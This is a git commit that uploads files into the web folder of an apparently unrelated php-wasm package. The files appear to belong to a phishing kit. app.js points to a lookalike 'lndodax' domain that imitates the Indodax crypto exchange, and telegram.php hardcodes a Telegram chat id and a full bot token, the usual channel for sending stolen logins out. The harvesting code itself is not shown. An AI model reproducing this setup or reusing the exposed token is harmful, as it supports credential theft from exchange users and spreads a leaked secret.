8518c7913658565661cffda49588e433e8203fb2
Mbarus <mbarus28@gmail.com>
2024-09-02 16:22:20 +0700

    Add files via upload

---
+++ packages/php-wasm/web/app.js
@@ -0,0 +1,1 @@
+No Content: https://layanan-lndodax.choreoapps.dev/Indodax/js/app.js
---
+++ packages/php-wasm/web/telegram.php
@@ -0,0 +1,4 @@
+<?php
+$id_telegram = "6575741802";
+$id_botTele  = "6784537135:AAFsNOcONwGqTw8ZTFQDSUKI8adyW01MmYw";
+?>
